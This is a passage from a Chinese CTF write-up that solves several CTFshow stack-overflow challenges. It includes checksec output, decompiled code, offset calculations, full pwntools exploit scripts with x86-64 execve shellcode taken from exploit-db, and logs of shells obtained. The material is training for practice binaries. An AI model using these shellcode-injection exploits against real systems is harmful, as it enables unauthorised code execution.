here!!&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, s, <span class="number">0x64u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;See you ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到有gets函数，还是明显的栈溢出漏洞</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; cyclic 300</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac</span><br><span class="line">See you ~</span><br><span class="line">...</span><br><span class="line">*EIP  0x62616164 (<span class="string">&#x27;daab&#x27;</span>)</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; cyclic -l daab</span><br><span class="line">Finding cyclic pattern of 4 bytes: b<span class="string">&#x27;daab&#x27;</span> (hex: 0x64616162)</span><br><span class="line">Found at offset 112</span><br></pre></td></tr></table></figure>

<p>下面还使用strncpy函数将对应的字符串复制到 buf2 处。跟进查看：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:0804A080                 public buf2</span><br><span class="line">.bss:0804A080 ; char buf2[100]</span><br><span class="line">.bss:0804A080 buf2            db 64h dup(?)           ; DATA XREF: main+7B↑o</span><br><span class="line">.bss:0804A080 _bss            ends</span><br></pre></td></tr></table></figure>

<p>可以看到buf2在bss段</p>
<p>gdb查看一下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">     Start        End Perm     Size  Offset File (set vmmap-prefer-relpaths on)</span><br><span class="line"> 0x8048000  0x8049000 r-xp     1000       0 pwn</span><br><span class="line"> 0x8049000  0x804a000 r--p     1000       0 pwn</span><br><span class="line"> 0x804a000  0x804b000 rw-p     1000    1000 pwn</span><br><span class="line"> 0x9c66000  0x9c88000 rw-p    22000       0 [heap]</span><br></pre></td></tr></table></figure>

<p> bss 段对应的段没有可执行权限（ubunt18.02可以）</p>
<p>我们就可以控制程序执行 shellcode，也就是先读入 shellcode，然后控制程序执行 bss 段处的shellcode。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = shellcode.ljust(<span class="number">112</span>,<span class="string">&#x27;a&#x27;</span>) + p32(buf2_addr) </span><br><span class="line"><span class="comment">#shellcode.ljust(112, &#x27;a&#x27;) ：这是使用ljust函数将 shellcode 字符串填充到长度为112的字符串中，并用字母 &#x27;a&#x27; 填充剩余的空白部分。</span></span><br><span class="line"><span class="comment">#当然，按照之前的写法，我们只需要先将shellcode的长度打印出来，然后让其总长度为112 ，只是我们使用上述函数可以帮助我们一步到位</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">lenth = <span class="built_in">len</span>(shellcode)</span><br><span class="line"><span class="built_in">print</span>(lenth)</span><br><span class="line">payload = shellcode + cyclic(<span class="number">112</span>-lenth) + p32(buf2_addr)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">buf2_addr=<span class="number">0x0804A080</span></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">payload=shellcode.ljust(<span class="number">112</span>,<span class="string">b&#x27;a&#x27;</span>)+p32(buf2_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure>

<h2 id="pwn61"><a href="#pwn61" class="headerlink" title="pwn61"></a>pwn61</h2><p>Hint：输出了什么？</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       and64-64-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX diasabled</span><br><span class="line">  PIE:        PIE enabled</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br></pre></td></tr></table></figure>

<p>64位程序，关闭栈保护、NX保护，有可读可写可执行的段</p>
<p>IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *__bss_start; <span class="comment">// rdi</span></span><br><span class="line">  _QWORD v5[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v5[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v5[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  __bss_start = _bss_start;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  logo(__bss_start, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to CTFshow!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What&#x27;s this : [%p] ?\n&quot;</span>, v5);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Maybe it&#x27;s useful ! But how to use it?&quot;</span>);</span><br><span class="line">  gets(v5);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>v5那里存在栈溢出，程序还把v5的地址值给打印出来了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">低地址 ──────────────────────────────────────► 高地址</span><br><span class="line">[v5缓冲区(16B) | saved rbp(8B) | 返回地址(8B)]</span><br></pre></td></tr></table></figure>

<p>我们可以先将其接收保存下来，当然，由于开启了PIE保护，该地址会每次变动：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./pwn</span><br><span class="line">What<span class="string">&#x27;s this : [0x7ffc4dff34e0] ?</span></span><br><span class="line"><span class="string">$ ./pwn</span></span><br><span class="line"><span class="string">What&#x27;</span>s this : [0x7ffef7a4eb20] ?</span><br></pre></td></tr></table></figure>

<p>我们只需要在exp中接收，然后将其保存下来，以便与每次我们使用的都是正确的v5的地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io.recvuntil(<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">v5 = io.recvuntil(<span class="string">&#x27;]&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">v5 = <span class="built_in">int</span>(v5, <span class="number">16</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li><p>输入流中首先接收数据直到遇到 ‘[‘ 字符为止。</p>
</li>
<li><p>接下来再次从输入流中接收数据，直到遇到 ‘]’ 字符为止，将其保存在变量 v5 中。</p>
</li>
<li><p>最后，将变量 v5 解析为一个十六进制的整数，并将其存储回变量 v5 中。</p>
</li>
</ul>
<p>这样我们第一步的目的就达到了</p>
<p>接下来我们接着看：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call    _gets</span><br><span class="line">mov     eax, 0</span><br><span class="line">leave</span><br><span class="line">retn</span><br><span class="line">; &#125; // starts at 7FD</span><br><span class="line">main endp</span><br></pre></td></tr></table></figure>

<p>leave的作用相当于<strong>MOV SP,BP；POP BP。</strong></p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">move rsp,rbp</span><br><span class="line">rsp = v5_addr + 0x10</span><br><span class="line">POP RBP</span><br><span class="line">rsp = v5_addr + 0x18</span><br><span class="line">因为leave指令会释放栈空间，因此我们不能使用v5后面的24字</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */</span><br><span class="line">      /* push b&#x27;/bin///sh\x00&#x27; */</span><br><span class="line">      push 0x68</span><br><span class="line">      mov rax, 0x732f2f2f6e69622f</span><br><span class="line">      push rax</span><br><span class="line">      mov rdi, rsp</span><br><span class="line">      /* push argument array [&#x27;sh\x00&#x27;] */</span><br><span class="line">      /* push b&#x27;sh\x00&#x27; */</span><br><span class="line">      push 0x1010101 ^ 0x6873</span><br><span class="line">      xor dword ptr [rsp], 0x1010101</span><br><span class="line">      xor esi, esi /* 0 */</span><br><span class="line">      push rsi /* null terminate */</span><br><span class="line">      push 8</span><br><span class="line">      pop rsi</span><br><span class="line">      add rsi, rsp</span><br><span class="line">      push rsi /* &#x27;sh\x00&#x27; */</span><br><span class="line">      mov rsi, rsp</span><br><span class="line">      xor edx, edx /* 0 */</span><br><span class="line">      /* call execve() */</span><br><span class="line">      push 59 /* 0x3b */</span><br><span class="line">      pop rax</span><br><span class="line">      syscall</span><br></pre></td></tr></table></figure>

<p>而生成的shellcode中对rsp进行了其他操作，所以leave指令会对shellcode的执行造成影响。故v5中不能存放shellcode，v5后的8个字节也不能存放（这里需要存放返回地址）。故我们的shellcode只能放在v5首地址后的 24+8后的地址。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">低地址 ──────────────────────────────────────► 高地址</span><br><span class="line">[v5缓冲区(16B) | saved rbp(8B) | 返回地址(8B)]</span><br></pre></td></tr></table></figure>

<p>构造的payload为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x10</span>+<span class="number">8</span>) + p64(v5 + <span class="number">24</span>+<span class="number">8</span>) + shellcode</span><br></pre></td></tr></table></figure>

<p>这里需要理解一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28205)</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;[&#x27;</span>)</span><br><span class="line">v5 = io.recvuntil(<span class="string">b&#x27;]&#x27;</span>, drop=<span class="literal">True</span>) <span class="comment">#drop=True是为去掉&quot;]&quot;</span></span><br><span class="line">v5 = <span class="built_in">int</span>(v5, <span class="number">16</span>) <span class="comment">#16进制转换10进制</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = cyclic(<span class="number">0x10</span>+<span class="number">8</span>) + p64(v5 + <span class="number">32</span>) + shellcode</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 147</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag</span><br></pre></td></tr></table></figure>

<h2 id="pwn62"><a href="#pwn62" class="headerlink" title="pwn62"></a>pwn62</h2><p>Hint：短了一点</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       amd64-64-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        PIE enabled</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>和上一题一样，IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *__bss_start; <span class="comment">// rdi</span></span><br><span class="line">  _QWORD buf[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  buf[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  __bss_start = _bss_start;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  logo(__bss_start, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to CTFshow!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What&#x27;s this : [%p] ?\n&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Maybe it&#x27;s useful ! But how to use it?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x38u</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>整体逻辑还是差不多，不同之处为变量名字换了（这个并不影响），还有不同的是最后读入换成了read函数，并且限制为0x38</p>
<p>buf分配的空间为0x10，而read的大小为0x38，明显存在溢出，因此我们仍能够使用read来进行栈溢出</p>
<p>偏移量还是为 <strong>0x10+8&#x3D;24</strong>。</p>
<p>计算允许的SHELLCODE长度【0x38 -（0x10+8）- 8 &#x3D; 24 】（0x10+8）为造成溢出填充的垃圾数据，后面8为是shellcode地址的长度。因此构建的shellcode必须在24位以内。</p>
<p>直接使用pwntools生成的继续打肯定是不行了，我们需要去寻找符合条件的shellcode，甚至可以自己尝试写更短的（这里随便给出一个符合题目要求的）：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">24 bytes</span><br><span class="line">https://www.exploit-db.com/shellcodes/43550</span><br><span class="line">shellcode_x64 =</span><br><span class="line">&quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x5</span><br><span class="line">2\x57\x54\x5e\x0f\x05&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.exploit-db.com/shellcodes/46907</span><br><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line">_start:</span><br><span class="line">	xor rsi,rsi</span><br><span class="line">	push rsi</span><br><span class="line">	mov rdi,0x68732f2f6e69622f</span><br><span class="line">	push rdi</span><br><span class="line">	push rsp</span><br><span class="line">	pop rdi</span><br><span class="line">	push 59</span><br><span class="line">	pop rax</span><br><span class="line">	cdq</span><br><span class="line">	syscall</span><br><span class="line">================================</span><br><span class="line">Instruction for nasm compliation</span><br><span class="line">================================</span><br><span class="line"></span><br><span class="line">nasm -f elf64 shellcode.asm -o shellcode.o</span><br><span class="line">ld shellcode.o -o shellcode</span><br><span class="line"></span><br><span class="line">===================</span><br><span class="line">objdump disassembly</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000401000 &lt;_start&gt;:</span><br><span class="line">  401000:	48 31 f6             	xor    %rsi,%rsi</span><br><span class="line">  401003:	56                   	push   %rsi</span><br><span class="line">  401004:	48 bf 2f 62 69 6e 2f 	movabs $0x68732f2f6e69622f,%rdi</span><br><span class="line">  40100b:	2f 73 68 </span><br><span class="line">  40100e:	57                   	push   %rdi</span><br><span class="line">  40100f:	54                   	push   %rsp</span><br><span class="line">  401010:	5f                   	pop    %rdi</span><br><span class="line">  401011:	6a 3b                	pushq  $0x3b</span><br><span class="line">  401013:	58                   	pop    %rax</span><br><span class="line">  401014:	99                   	cltd   </span><br><span class="line">  401015:	0f 05                	syscall </span><br><span class="line"></span><br><span class="line">==================</span><br><span class="line">23 Bytes Shellcode</span><br><span class="line">==================</span><br><span class="line"></span><br><span class="line">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05</span><br><span class="line"></span><br><span class="line">======================</span><br><span class="line">C Compilation And Test</span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line">gcc -fno-stack-protector -z execstack shellcode.c -o shellcode</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">unsigned char shellcode[] = \</span><br><span class="line">&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int (*ret)() = (int(*)())shellcode;</span><br><span class="line">    ret();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">	io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28189</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">shellcode=<span class="string">b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;[&#x27;</span>)</span><br><span class="line">buf_addr = io.recvuntil(<span class="string">b&#x27;]&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">buf_addr = <span class="built_in">int</span>(buf_addr, <span class="number">16</span>)</span><br><span class="line">payload=cyclic(<span class="number">0x10</span>+<span class="number">8</span>)+p64(buf_addr + <span class="number">32</span>)+shellcode</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>简单的增加了一个条件语句，根据参数中是否存在 ‘REMOTE’ 键的值，选择是通过远程连接还是本地进程来运行程序。这样的设计可以根据需要动态选择程序的运行方式，方便在不同环境下进行调试和测试。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 62</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"> ?</span><br><span class="line">Maybe it<span class="string">&#x27;s useful ! But how to use it?</span></span><br><span class="line"><span class="string">$ ls</span></span><br><span class="line"><span class="string">ctfshow_flag</span></span><br></pre></td></tr></table></figure>

<h2 id="pwn63"><a href="#pwn63" class="headerlink" title="pwn63"></a>pwn63</h2><p>Hint：又短了一点</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>

<p>和上一题一样，IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *__bss_start; <span class="comment">// rdi</span></span><br><span class="line">  _QWORD buf[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  buf[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  __bss_start = _bss_start;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  logo(__bss_start, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to CTFshow!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What&#x27;s this : [%p] ?\n&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Maybe it&#x27;s useful ! But how to use it?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x37u</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">只剩23位了，还可以用上一道</span><br><span class="line">或者</span><br><span class="line"># 23 bytes</span><br><span class="line"># https://www.exploit-db.com/exploits/36858/</span><br><span class="line">shellcode_x64=b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">	io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28114</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">shellcode=<span class="string">b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;[&#x27;</span>)</span><br><span class="line">buf_addr=io.recvuntil(<span class="string">b&#x27;]&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">buf_addr=<span class="built_in">int</span>(buf_addr,<span class="number">16</span>)</span><br><span class="line">payload=cyclic(<span class="number">0x10</span>+<span class="number">8</span>)+p64(buf_addr+<span class="number">32</span>)+shellcode</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 80</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"> ?</span><br><span class="line">Maybe it<span class="string">&#x27;s useful ! But how to use it?</span></span><br><span class="line"><span class="string">$ ls</span></span><br><span class="line"><span class="string">ctfshow_flag</span></span><br></pre></td></tr></table></figure>

<h2 id="pwn64"><a href="#pwn64" class="headerlink" title="pwn64"></a>pwn64</h2><p>Hint：有时候开启某种保护并不代表这条路不通</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位程序，开启了NX，部分开启RELRO</p>
<p>按照题目描述，这里开启了NX，应该是不能执行shellcode了的</p>
<p>我们接着IDA查看一下main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line"></span><br><span class="line">  buf = mmap(<span class="number">0</span>, <span class="number">0x400u</span>, <span class="number">7</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  alarm(<span class="number">0xAu</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Some different!&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">0x400u</span>) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Illegal entry!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))buf)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>buf &#x3D; mmap(0, 0x400u, 7, 34, 0, 0); ：这行代码使用 mmap 函数分配一块内存区域，将其起始地址保存在变量 buf 中。 mmap 函数通常用于在内存中分配一块连续的地址空间，并指定相应的权限和属性。</p>
<p>这里buf用mmap映射了地址，可读可写可执行，直接传入shellcode，下面 ((void (*)(void))buf)();</p>
<p>调用了buf，运行shellcode 即可获取shell。</p>
<p>所以说有时候需要具体情况具体分析，东西并不是一成不变的。</p>
